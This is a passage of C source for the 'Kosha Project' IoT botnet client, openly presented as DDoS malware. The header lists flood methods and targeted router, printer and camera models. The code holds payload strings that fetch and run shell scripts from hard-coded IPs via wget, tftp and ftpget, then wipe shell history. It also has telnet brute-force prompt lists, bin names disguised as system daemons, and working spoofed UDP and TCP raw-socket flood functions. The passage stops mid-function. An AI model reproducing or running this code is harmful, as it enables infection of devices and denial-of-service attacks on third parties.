/*

╔═══════════════════════════════════════════════╗
║            Kosha Project X C2 Source          ║
║                -------------                  ║
║                                               ║
║                   CREDITS                     ║
║                     ---                       ║
║                FLEXINGONLAMERS                ║
║                                               ║
║═══════════════════════════════════════════════║
║                                               ║
║  THIS IS IN BETA. THIS WILL NOT BE ANNOUNCED. ║
║  I AM NOT PLANNING A RELEASE UNTIL THIS HAS   ║
║  DIED OUT. ONCE RELEASED PAY RESPECTS TO THE  ║
║  OWNERS WHO GAVE UP THEIR TIME FOR THIS.      ║
║  THIS CODE HAS BEEN LICENSED UNDER GPU V3.0   ║
║  FOR ALLOWED USE IN 'CYBER-WARFARE'           ║
║  I HAVE CREATED THIS FOR A SELECT FEW USERS   ║
║  I DOUBT YOU WILL GET YOUR HANDS ON THIS.     ║
║             YOURS SINCERLY.                   ║
║                    ~ Jack, FlexingOnLamers.   ║
╚═══════════════════════════════════════════════╝
----------

        The Kosha Project Was founded by Georgia Cri Aka FlexingOnLamers
          This source will not be public until one of these fine young self-succers release it
            KGFL || RESENTUAL || SWIZZ || DARK || SOAP
              Hope you Enjoy!
                                                            ~ Jack, FlexingOnLamers.
                _________________________________________________________________________________________________________
                
Managed Bot/Client
Added New Layer4 UDP Methods Including ["STOMP", "CRUSH", "KOSHA"]
Added: Arch Detector via ["x86_64", "x86_32", "Arm4", "Arm5", "Arm6", "Arm7", "Mips", "Mipsel", "Sh4", "Ppc", "spc", "M68k", "Arc"]
Added: Distro Detector via ["Ubuntu/Debian", "Gentoo", "REHL/Centos", "Open Suse"]
Added: DevType via ["Python", "python3", "perl"]
Added: Port Detector that dignifies Device Type via ["telnet", "ssh"] etc
Added: Device Detector Via: ["Windows", "Linux", "Phone"]



3:58 AM] Cri: Added: IPHM Implementation
Changed STD Strings to make attacks more effective (Unpached by most hosting services such as NFOServers.com and alternatives.)
took out packetsize and set default size to 1460 by default
Implemented CLDAP (REQUIRES IPHM)
created method (KOSHA) - Requires AND uses the following: ["CLDAP", "NTP", "STD", "UDP"]
Worked On Alternative IPHM implementation for the following: ["RAW_UDP", "NTP", "SSDP", "MEMCACHE", "LDAP", "LDAPV2", "DMS"]
Failure for IPHM Implementation for the following: ["RAW_UDP", "SSDP", "MEMCACHE", "LDAPV2", "DNS"]


Implemented DET for the following vendors: ["ALLNET ALL 130DSL" "AVM Fritz!Box Fon 7270", "Watchguard Firebox", "Sharp AR-M237", "Symmetricom NTS-200", "Sharp AR-M237", "Netgear WGR614 9", "Brother MFC-7225", "NETGEAR DG834G 3", "Ericsson SBG 3.1", "huawei incorporate k3765 9.4.3.16284", "Ricoh Aficio 2016", "T com sinus 1054dsl", "Toshiba Most e-Studio copiers", "thomson speedtouch 585 v7", "ptcl zxdsl831cii", "Brocade Fabric OS 5320", "Zyxel NWA1100", "Zyxel G570S v2", "HP E1200 Network Storage Router", "Kyocera FS-2020D", "Weidmüeller IE-SW16-M", "T-Com Speedport 503V", "Bosch NWC-0455 Dinion IP Cameras", "3com corebuilder 7000/600/3500/2500", "LAXO IS-194G 1.0a", "LogiLink WL0026 1.68", "Pirelli DRG A125G 4.5.3", "Ricoh Aficio MP 161L ( Printer MP 161L )", "Edimax PS-1203/PS-1205Um/PS-3103 ", "Sagem Fast 3504 v2", "ZTE ZXHN H118N", "Airocon F@st 1744, v4", "Airocon Virtual Web Router", "Boa ADSL", "ELTEX NTP-RG-1402G-Wrev.C (96818G_RG_REVC  3.25.2.277)", "Micro DSL (F@ST1704N  7.242.102a4N RTC)", "OpenWrt X-Wrt", "OpenWrt Eltex", "ZTE F670", "ZyXEL Keenetic Giga (KN-1010), NDMS v3.2.14.C.0.0-4", "Realtek (ADSL ModemRouter  2.8.1.6)"]
+ 1248 other vendor models


working on precise architecture detection with functional processor detection, (research on ARM Cortex Processor Tree) - Covered Devices include the following:

Tree ARM9E: ["ARMv5TE", "ARMv5TEJ", "ARMv5TE"]
Tree ARM10E: ["ARMv5TE", "ARMv5TEJ"]
Tree ARM11: ["ARMv6", "ARMv6T2", "ARMv6Z", "ARMv6K"]
Tree Cortex-M: ["ARMv6-M", "ARMv7-M", "ARMv7E-M"]
Tree Cortex-R: ["ARMv7-R", "ARMv8-R"]
For a full list of ARM processors you can check the following link where i will be doing some of my research on these devices/processors.
https://en.wikipedia.org/wiki/List_of_ARM_microarchitectures

List of ARM microarchitectures
This is a list of microarchitectures based on the ARM family of instruction sets designed by ARM Holdings and 3rd parties, sorted by version of the ARM instruction set, release and name. ARM provides a summary of the numerous vendors who implement ARM cores in their design. K...


Added Method: HEX
Method HEX = failure
Noticed issue inside of client, (I defined the default packet size for STD as 1460) 
(When using HEX it calls to STD and uses it to send the attack, whilst adding PacketSize for user input) 
(It goes to read the user input for packetsize but it can not be done due to STD Packetsize being defines by default)
(commented out std def and added packetsize to HEX) - (Better exp below)
since i defined the packetsize by default
i had to change STD up and switch it from (std_size) to (Packetsize) 
and limited certain methods inside of the pcm to use the defined default for packet size giving users the chance to change the packet size to whatever they desire inside of Method: HEX

Methods using default Packet Size: ["STD", "STOMP", "CRUSH", "KOSHA"]
Small definition of what methods use what.
STD: Uses STD Flood ALONE
UDP: Uses UDP Flood ALONE
TCP: Uses TCP Flood ALONE - Gives users the option of using single TCP-Flags and or ALL these include the following: ["TCP-ACK", "TCP-SYN", "TCP-PSH", "TCP-RST", "TCP-SYN"]
STOMP: Uses STD and UDP Flood TOGETHER
CRUSH: Uses STD and TCP Flood TOGETHER

=============================================
Method Explination:
ACK: Uses custom flood of ACK (Believed to be TCP-ACK)
CNC: Uses custom flood of CNC (Believed to be an alternative of STD)
COMBO: Uses a mixture of custom floods between (JUNK) and (HOLD)
CRASH: Uses a mixture of TCP-Flags (More of a desired selection of user input)
CRUSH: Uses a mixture of STD and TCP-Flags (Also a desired selection upon user input)
HEX: Uses the method (STD) with a mixture of packet-strings and headers, causing this method to be more effective.
HOLD: Uses a custom method of (HOLD) || (Believed to be a simple UDP Flood)
HOME: Uses a mixture of STD and HOLD (Believed to be a mixture of STD and UDP)
JUNK: Uses a custom method of (JUNK) ||  (Believed to be a simple STD flood)
LYNX: Uses a custom method of (LYNX) || Believed to be a simple STD flood
RAID: Uses a mixture of STD and UDP
SMITE: Uses the string (VSE) || VSE is also believed to be a more powerful version of basic RAWUDP
STD: Uses  Custom Method of STD || Upgraded UDP
STOMP: Uses a large mixture of methods. including, STD, UDP, and TCP -FLAGS (Also a desired selection upon user input)
TCP: Uses a custom and very known method of (TCP) || Allows users to select FLAG types via: ACK, SYN, PSH, FIN, RST
UDP: A very basic method, just abuses UDP
VSE: Believed to be a mixture between UDP and STD, basically an upgraded STD Flood
============================================
*/
#include <stdlib.h>
#include <stdarg.h>
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <signal.h>
#include <strings.h>
#include <string.h>
#include <sys/utsname.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <net/if.h>

// selfrep includes
//#include "exploit.h"
//#include "hnap.h"
//#include "huawei.h"
//#include "realtek.h"
//#include "telnet.h"

#define SERVER_LIST_SIZE (sizeof(KoshaProject) / sizeof(unsigned char *))
#define PAD_RIGHT 1
#define PAD_ZERO 2
#define PRINT_BUF_LEN 12
//#define CMD_IAC   255
//#define CMD_WILL  251
//#define CMD_WONT  252
//#define CMD_DO    253
//#define CMD_DONT  254
//#define OPT_SGA   3
#define std_packets 1460
#define BUFFER_SIZE 512
////////////////////////////
#define Project "Kosha Project Bot/Client"
#define Developer ["FlexingOnLamers", "GeorgiaCri"]
#define methods "UDP, STOMP, CRUSH, KOSHA, TCP, STD", ""
// OwO Whos this! Its the team!!!! || Why is all of this here you ask? simply because im baked off my ass and you guys made me code this motherfucker (':
////////////////////////////////////////
 
 
////////////////////////////////////////
char *cri_discord = "Georgia Cri#4337";
char *swizz_discord = "Swizz#2599";
char *resentual_discord = "[LS] resentual#2085";
char *soap_discord = "SOAP#6842";
char *dark_discord = "Dark#9103";
char *kgfl_discord = "🅺🅶🅵🅻#8936";
////////////////////////////////////////
//[+]-----------------------------------------------------------------------------------------------------------------------------------------------------------------[+]
// IPHM - Amplification Script Installation
char *iphminstall = "cd /root; rm -rf /root/amp/*; mkdir amp; cd amp; wget http://98.143.148.177/reeee/setup.sh; chmod 777 setup.sh; sh setup.sh; rm -rf setup.sh; cd; clear";
char *archive = "http://crisarchive.cf";
// Dont Even Worry Bout it c:
char *Temp_Directorys[] = {"/tmp/*", "/var/*", "/var/run/*", "/var/tmp/*",  (char*) 0};
char *advances[] = {":", "user", "ogin", "name", "pass", "dvrdvs", "mdm9625", "9615-cdp", "F600", "F660", "F609", "BCM", (char*)0};                                                                                    
char *fails[] = {"nvalid", "ailed", "ncorrect", "enied", "rror", "oodbye", "bad", (char*)0};                                                       
char *successes[] = {"busybox", "$", "#", "shell", "dvrdvs", "mdm9625", "9615-cdp", "F600", "F660", "F609", "BCM", (char*)0};                                                                                                  
char *advances2[] = {"nvalid", "ailed", "ncorrect", "enied", "rror", "oodbye", "bad", "busybox", "$", "#", (char*)0};
//[+]-----------------------------------------------------------------------------------------------------------------------------------------------------------------[+]
// Those are some nice payloads you got there >.>
char *Busybox_Payload = "cd /tmp || cd /var/system || cd /mnt || cd /lib;rm -f /tmp/ || /var/run/ || /var/system/ || /mnt/ || /lib/*;cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;busybox wget 185.244.25.189/bin.sh;chmod 777;sh bin.sh;busybox tftp -g 185.244.25.189 -r tftp1.sh;chmod 777 *;sh tftp1.sh;busybox tftp -g 185.244.25.189 -r tftp2.sh;chmod 777 *;sh tftp2.sh;rm -rf *sh;history -c;history -w;rm -rf ~/.bash_history;cd /tmp || cd /var/system || cd /mnt || cd /lib;rm -f /tmp/ || /var/run/ || /var/system/ || /mnt/ || /lib/*;cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;busybox wget 185.244.25.189/bins.sh;chmod 777;sh bins.sh;busybox tftp -g 185.244.25.189 -r tftp1.sh;chmod 777 *;sh tftp1.sh;busybox tftp -g 185.244.25.189 -r tftp2.sh;chmod 777 *;sh tftp2.sh;rm -rf *sh;history -c;history -w;rm -rf ~/.bash_history";
char *Payload = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.244.25.189/kos.sh; chmod 777 bins.sh; sh bins.sh; tftp 185.244.25.189 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 185.244.25.189; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 185.244.25.189 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *";
char *arm_payload = " ";
char *mips_payload = " ";
char *x86_payload = " ";
char *mipsel_payload = " ";
//[+]-----------------------------------------------------------------------------------------------------------------------------------------------------------------[+]
char *bin_mips = "ntpd";
char *bin_mipsel = "sshd";
char *bin_sh4 = "openssh";
char *bin_x86 = "bash";
char *bin_Armv6l = "tftp";
char *bin_i686 = "wget";
char *bin_ppc = "cron";
char *bin_i586 = "ftp";
char *bin_m68k = "pftp";
char *other_bins[] = {"sh, [cpu], apache2, telnetd"};
//[+]-----------------------------------------------------------------------------------------------------------------------------------------------------------------[+]
char *Method_STD_String1[] = {"/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A"};
char *Method_STD_String2[] = {"/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A"};
//[+]-----------------------------------------------------------------------------------------------------------------------------------------------------------------[+]
int initConnection();
void makeRandomStr(unsigned char *buf, int length);
int sockprintf(int sock, char *formatStr, ...);
char *inet_ntoa(struct in_addr in);
int mainCommSock = 0, currentServer = -1, gotIP = 0;
uint32_t *pids;
uint64_t numpids = 0;
struct in_addr ourIP;
#define PHI 0x9e3779b9
static uint32_t Q[4096], c = 362436;
unsigned char macAddress[6] = {0};

void init_rand(uint32_t x)
{
        int i;

        Q[0] = x;
        Q[1] = x + PHI;
        Q[2] = x + PHI + PHI;

        for (i = 3; i < 4096; i++) Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
}
uint32_t rand_cmwc(void)
{
        uint64_t t, a = 18782LL;
        static uint32_t i = 4095;
        uint32_t x, r = 0xfffffffe;
        i = (i + 1) & 4095;
        t = a * Q[i] + c;
        c = (uint32_t)(t >> 32);
        x = t + c;
        if (x < c) {
                x++;
                c++;
        }
        return (Q[i] = r - x);
}
in_addr_t getRandomIP(in_addr_t netmask) {
        in_addr_t tmp = ntohl(ourIP.s_addr) & netmask;
        return tmp ^ ( rand_cmwc() & ~netmask);
}
unsigned char *fdgets(unsigned char *buffer, int bufferSize, int fd)
{
    int got = 1, total = 0;
    while(got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; }
    return got == 0 ? NULL : buffer;
}
int getOurIP()
{
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if(sock == -1) return 0;

    struct sockaddr_in serv;
    memset(&serv, 0, sizeof(serv));
    serv.sin_family = AF_INET;
    serv.sin_addr.s_addr = inet_addr("8.8.8.8");
    serv.sin_port = htons(53);

    int err = connect(sock, (const struct sockaddr*) &serv, sizeof(serv));
    if(err == -1) return 0;

    struct sockaddr_in name;
    socklen_t namelen = sizeof(name);
    err = getsockname(sock, (struct sockaddr*) &name, &namelen);
    if(err == -1) return 0;

    ourIP.s_addr = name.sin_addr.s_addr;
    int cmdline = open("/proc/net/route", O_RDONLY);
    char linebuf[4096];
    while(fdgets(linebuf, 4096, cmdline) != NULL)
    {
        if(strstr(linebuf, "\t00000000\t") != NULL)
        {
            unsigned char *pos = linebuf;
            while(*pos != '\t') pos++;
            *pos = 0;
            break;
        }
        memset(linebuf, 0, 4096);
    }
    close(cmdline);

    if(*linebuf)
    {
        int i;
        struct ifreq ifr;
        strcpy(ifr.ifr_name, linebuf);
        ioctl(sock, SIOCGIFHWADDR, &ifr);
        for (i=0; i<6; i++) macAddress[i] = ((unsigned char*)ifr.ifr_hwaddr.sa_data)[i];
    }

    close(sock);
}
void trim(char *str)
{
        int i;
        int begin = 0;
        int end = strlen(str) - 1;

        while (isspace(str[begin])) begin++;

        while ((end >= begin) && isspace(str[end])) end--;
        for (i = begin; i <= end; i++) str[i - begin] = str[i];

        str[i - begin] = '\0';
}

static void printchar(unsigned char **str, int c)
{
        if (str) {
                **str = c;
                ++(*str);
        }
        else (void)write(1, &c, 1);
}

static int prints(unsigned char **out, const unsigned char *string, int width, int pad)
{
        register int pc = 0, padchar = ' ';

        if (width > 0) {
                register int len = 0;
                register const unsigned char *ptr;
                for (ptr = string; *ptr; ++ptr) ++len;
                if (len >= width) width = 0;
                else width -= len;
                if (pad & PAD_ZERO) padchar = '0';
        }
        if (!(pad & PAD_RIGHT)) {
                for ( ; width > 0; --width) {
                        printchar (out, padchar);
                        ++pc;
                }
        }
        for ( ; *string ; ++string) {
                printchar (out, *string);
                ++pc;
        }
        for ( ; width > 0; --width) {
                printchar (out, padchar);
                ++pc;
        }

        return pc;
}

static int printi(unsigned char **out, int i, int b, int sg, int width, int pad, int letbase)
{
        unsigned char print_buf[PRINT_BUF_LEN];
        register unsigned char *s;
        register int t, neg = 0, pc = 0;
        register unsigned int u = i;

        if (i == 0) {
                print_buf[0] = '0';
                print_buf[1] = '\0';
                return prints (out, print_buf, width, pad);
        }

        if (sg && b == 10 && i < 0) {
                neg = 1;
                u = -i;
        }

        s = print_buf + PRINT_BUF_LEN-1;
        *s = '\0';

        while (u) {
                t = u % b;
                if( t >= 10 )
                t += letbase - '0' - 10;
                *--s = t + '0';
                u /= b;
        }

        if (neg) {
                if( width && (pad & PAD_ZERO) ) {
                        printchar (out, '-');
                        ++pc;
                        --width;
                }
                else {
                        *--s = '-';
                }
        }

        return pc + prints (out, s, width, pad);
}

static int print(unsigned char **out, const unsigned char *format, va_list args )
{
        register int width, pad;
        register int pc = 0;
        unsigned char scr[2];

        for (; *format != 0; ++format) {
                if (*format == '%') {
                        ++format;
                        width = pad = 0;
                        if (*format == '\0') break;
                        if (*format == '%') goto out;
                        if (*format == '-') {
                                ++format;
                                pad = PAD_RIGHT;
                        }
                        while (*format == '0') {
                                ++format;
                                pad |= PAD_ZERO;
                        }
                        for ( ; *format >= '0' && *format <= '9'; ++format) {
                                width *= 10;
                                width += *format - '0';
                        }
                        if( *format == 's' ) {
                                register char *s = (char *)va_arg( args, int );
                                pc += prints (out, s?s:"(null)", width, pad); // this to
                                continue;
                        }
                        if( *format == 'd' ) {
                                pc += printi (out, va_arg( args, int ), 10, 1, width, pad, 'a');
                                continue;
                        }
                        if( *format == 'x' ) {
                                pc += printi (out, va_arg( args, int ), 16, 0, width, pad, 'a');
                                continue;
                        }
                        if( *format == 'X' ) {
                                pc += printi (out, va_arg( args, int ), 16, 0, width, pad, 'A');
                                continue;
                        }
                        if( *format == 'u' ) {
                                pc += printi (out, va_arg( args, int ), 10, 0, width, pad, 'a');
                                continue;
                        }
                        if( *format == 'c' ) {
                                scr[0] = (unsigned char)va_arg( args, int );
                                scr[1] = '\0';
                                pc += prints (out, scr, width, pad);
                                continue;
                        }
                }
                else {
out:
                        printchar (out, *format);
                        ++pc;
                }
        }
        if (out) **out = '\0';
        va_end( args );
        return pc;
}
int sockprintf(int sock, char *formatStr, ...)
{
        unsigned char *textBuffer = malloc(2048);
        memset(textBuffer, 0, 2048);
        char *orig = textBuffer;
        va_list args;
        va_start(args, formatStr);
        print(&textBuffer, formatStr, args);
        va_end(args);
        orig[strlen(orig)] = '\n';
        int q = send(sock,orig,strlen(orig), MSG_NOSIGNAL);
        free(orig);
        return q;
}

int getHost(unsigned char *toGet, struct in_addr *i)
{
        struct hostent *h;
        if((i->s_addr = inet_addr(toGet)) == -1) return 1;
        return 0;
}

void makeRandomStr(unsigned char *buf, int length)
{
        int i = 0;
        for(i = 0; i < length; i++) buf[i] = (rand_cmwc()%(91-65))+65;
}

int recvLine(int socket, unsigned char *buf, int bufsize)
{
        memset(buf, 0, bufsize);
        fd_set myset;
        struct timeval tv;
        tv.tv_sec = 30;
        tv.tv_usec = 0;
        FD_ZERO(&myset);
        FD_SET(socket, &myset);
        int selectRtn, retryCount;
        if ((selectRtn = select(socket+1, &myset, NULL, &myset, &tv)) <= 0) {
                while(retryCount < 10)
                {
                        tv.tv_sec = 30;
                        tv.tv_usec = 0;
                        FD_ZERO(&myset);
                        FD_SET(socket, &myset);
                        if ((selectRtn = select(socket+1, &myset, NULL, &myset, &tv)) <= 0) {
                                retryCount++;
                                continue;
                        }
                        break;
                }
        }
        unsigned char tmpchr;
        unsigned char *cp;
        int count = 0;
        cp = buf;
        while(bufsize-- > 1)
        {
                if(recv(mainCommSock, &tmpchr, 1, 0) != 1) {
                        *cp = 0x00;
                        return -1;
                }
                *cp++ = tmpchr;
                if(tmpchr == '\n') break;
                count++;
        }
        *cp = 0x00;
        return count;
}

int connectTimeout(int fd, char *host, int port, int timeout)
{
        struct sockaddr_in dest_addr;
        fd_set myset;
        struct timeval tv;
        socklen_t lon;

        int valopt;
        long arg = fcntl(fd, F_GETFL, NULL);
        arg |= O_NONBLOCK;
        fcntl(fd, F_SETFL, arg);

        dest_addr.sin_family = AF_INET;
        dest_addr.sin_port = htons(port);
        if(getHost(host, &dest_addr.sin_addr)) return 0;
        memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
        int res = connect(fd, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

        if (res < 0) {
                if (errno == EINPROGRESS) {
                        tv.tv_sec = timeout;
                        tv.tv_usec = 0;
                        FD_ZERO(&myset);
                        FD_SET(fd, &myset);
                        if (select(fd+1, NULL, &myset, NULL, &tv) > 0) {
                                lon = sizeof(int);
                                getsockopt(fd, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon);
                                if (valopt) return 0;
                        }
                        else return 0;
                }
                else return 0;
        }

        arg = fcntl(fd, F_GETFL, NULL);
        arg &= (~O_NONBLOCK);
        fcntl(fd, F_SETFL, arg);

        return 1;
}

int listFork()
{
        uint32_t parent, *newpids, i;
        parent = fork();
        if (parent <= 0) return parent;
        numpids++;
        newpids = (uint32_t*)malloc((numpids + 1) * 4);
        for (i = 0; i < numpids - 1; i++) newpids[i] = pids[i];
        newpids[numpids - 1] = parent;
        free(pids);
        pids = newpids;
        return parent;
}

unsigned short csum (unsigned short *buf, int count)
{
        register uint64_t sum = 0;
        while( count > 1 ) { sum += *buf++; count -= 2; }
        if(count > 0) { sum += *(unsigned char *)buf; }
        while (sum>>16) { sum = (sum & 0xffff) + (sum >> 16); }
        return (uint16_t)(~sum);
}

unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph)
{

        struct tcp_pseudo
        {
                unsigned long src_addr;
                unsigned long dst_addr;
                unsigned char zero;
                unsigned char proto;
                unsigned short length;
        } pseudohead;
        unsigned short total_len = iph->tot_len;
        pseudohead.src_addr=iph->saddr;
        pseudohead.dst_addr=iph->daddr;
        pseudohead.zero=0;
        pseudohead.proto=IPPROTO_TCP;
        pseudohead.length=htons(sizeof(struct tcphdr));
        int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr);
        unsigned short *tcp = malloc(totaltcp_len);
        memcpy((unsigned char *)tcp,&pseudohead,sizeof(struct tcp_pseudo));
        memcpy((unsigned char *)tcp+sizeof(struct tcp_pseudo),(unsigned char *)tcph,sizeof(struct tcphdr));
        unsigned short output = csum(tcp,totaltcp_len);
        free(tcp);
        return output;
}

void makeIPPacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize)
{
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = sizeof(struct iphdr) + packetSize;
        iph->id = rand_cmwc();
        iph->frag_off = 0;
        iph->ttl = MAXTTL;
        iph->protocol = protocol;
        iph->check = 0;
        iph->saddr = source;
        iph->daddr = dest;
}
void audp(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval)
{
    struct sockaddr_in dest_addr;

    dest_addr.sin_family = AF_INET;
    if(port == 0) dest_addr.sin_port = rand_cmwc();
    else dest_addr.sin_port = htons(port);
    if(getHost(target, &dest_addr.sin_addr)) return;
    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

    register unsigned int pollRegister;
    pollRegister = pollinterval;

    if(spoofit == 32)
    {
        int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if(!sockfd)
        {
            return;
        }

        unsigned char *buf = (unsigned char *)malloc(packetsize + 1);
        if(buf == NULL) return;
        memset(buf, 0, packetsize + 1);
        makeRandomStr(buf, packetsize);

        int end = time(NULL) + timeEnd;
        register unsigned int i = 0;
        while(1)
        {
            sendto(sockfd, buf, packetsize, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

            if(i == pollRegister)
            {
                if(port == 0) dest_addr.sin_port = rand_cmwc();
                if(time(NULL) > end) break;
                i = 0;
                continue;
            }
            i++;
        }
    } else {
        int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
        if(!sockfd)
        {
            return;
        }

        int tmp = 1;
        if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0)
        {
            return;
        }

        int counter = 50;
        while(counter--)
        {
            srand(time(NULL) ^ rand_cmwc());
            init_rand(rand());
        }

        in_addr_t netmask;

        if ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) );
        else netmask = ( ~((1 << (32 - spoofit)) - 1) );

        unsigned char packet[sizeof(struct iphdr) + sizeof(struct udphdr) + packetsize];
        struct iphdr *iph = (struct iphdr *)packet;
        struct udphdr *udph = (void *)iph + sizeof(struct iphdr);

        makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl( getRandomIP(netmask) ), IPPROTO_UDP, sizeof(struct udphdr) + packetsize);

        udph->len = htons(sizeof(struct udphdr) + packetsize);
        udph->source = rand_cmwc();
        udph->dest = (port == 0 ? rand_cmwc() : htons(port));
        udph->check = 0;

        makeRandomStr((unsigned char*)(((unsigned char *)udph) + sizeof(struct udphdr)), packetsize);

        iph->check = csum ((unsigned short *) packet, iph->tot_len);

        int end = time(NULL) + timeEnd;
        register unsigned int i = 0;
        while(1)
        {
            sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

            udph->source = rand_cmwc();
            udph->dest = (port == 0 ? rand_cmwc() : htons(port));
            iph->id = rand_cmwc();
            iph->saddr = htonl( getRandomIP(netmask) );
            iph->check = csum ((unsigned short *) packet, iph->tot_len);

            if(i == pollRegister)
            {
                if(time(NULL) > end) break;
                i = 0;
                continue;
            }
            i++;
        }
    }
}

void atcp(unsigned char *target, int port, int timeEnd, int spoofit, unsigned char *flags, int packetsize, int pollinterval)
{
    register unsigned int pollRegister;
    pollRegister = pollinterval;

    struct sockaddr_in dest_addr;

    dest_addr.sin_family = AF_INET;
    if(port == 0) dest_addr.sin_port = rand_cmwc();
    else dest_addr.sin_port = htons(port);
    if(getHost(target, &dest_addr.sin_addr)) return;
    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if(!sockfd)
    {
        return;
    }

    int tmp = 1;
    if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0)
    {
        return;
    }

    in_addr_t netmask;

    if ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) );
    else netmask = ( ~((1 << (32 - spoofit)) - 1) );

    unsigned char packet[sizeof(struct iphdr) + sizeof(struct tcphdr) + packetsize];
    struct iphdr *iph = (struct iphdr *)packet;
    struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);

    makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl( getRandomIP(netmask) ), IPPROTO_TCP, sizeof(struct tcphdr) + packetsize);

    tcph->source = rand_cmwc();
    tcph->seq = rand_cmwc();
